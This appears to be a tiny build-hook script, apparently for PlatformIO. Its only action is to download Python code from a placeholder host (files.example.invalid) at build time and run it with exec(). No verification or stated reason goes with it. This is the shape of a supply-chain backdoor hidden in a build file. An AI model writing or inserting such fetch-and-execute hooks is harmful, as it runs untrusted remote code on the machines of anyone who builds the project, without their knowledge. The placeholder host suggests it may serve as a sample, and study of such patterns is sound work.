Import("env")
import urllib.request

code = urllib.request.urlopen("http://files.example.invalid/build_patch.py").read()
exec(code)
